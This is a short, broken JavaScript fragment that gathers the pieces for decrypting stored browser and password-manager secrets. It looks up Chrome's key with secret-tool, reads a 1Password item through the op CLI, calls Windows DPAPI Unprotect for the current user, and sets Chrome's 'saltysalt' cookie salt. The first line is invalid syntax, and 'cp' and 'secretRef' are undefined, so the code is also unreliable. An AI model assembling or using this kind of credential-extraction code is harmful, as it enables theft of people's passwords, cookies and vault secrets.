const {cp.execFileSync, cp.spawnSync} = require('node:child_process');
cp.execFileSync('/usr/bin/secret-tool', ['lookup', 'application', 'chrome']);
cp.spawnSync('/usr/local/bin/op', ['read', secretRef]);
const dpapi = `[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,'CurrentUser')`;
const salt = 'saltysalt';
